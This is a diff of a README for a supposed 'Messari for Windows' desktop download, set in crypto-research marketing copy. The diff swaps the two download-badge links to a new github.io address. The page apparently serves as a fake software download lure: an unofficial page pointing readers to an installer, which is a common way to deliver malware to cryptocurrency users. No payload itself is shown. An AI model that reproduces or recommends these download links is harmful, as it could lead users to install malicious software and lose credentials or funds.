@@ -4,7 +4,7 @@
 
 ## 📥 Download Messari for Windows
 
-[![⬇️ Download Messari](https://img.shields.io/badge/Download-Messari-blue?style=for-the-badge&logo=windows)](https://messari-windows-download.github.io/.github)
+[![⬇️ Download Messari](https://img.shields.io/badge/Download-Messari-blue?style=for-the-badge&logo=windows)](https://messari-for-windows.github.io/.github/messari)
 
 ---
 
@@ -22,7 +22,7 @@ Messari’s research division publishes comprehensive reports and daily market b
 
 Security and reliability are core priorities, with a robust infrastructure ensuring uptime, accuracy, and timely delivery of information. Whether you are an active day trader looking for intraday movements, a long-term investor evaluating portfolio performance, or a research professional analyzing blockchain networks, Messari delivers the intelligence, tools, and clarity needed to succeed in the complex digital asset landscape.
 
-[![⬇️ Download Messari](https://img.shields.io/badge/Download-Messari-blue?style=for-the-badge&logo=windows)](https://messari-windows-download.github.io/.github)
+[![⬇️ Download Messari](https://img.shields.io/badge/Download-Messari-blue?style=for-the-badge&logo=windows)](https://messari-for-windows.github.io/.github/messari)
 
 ---
 
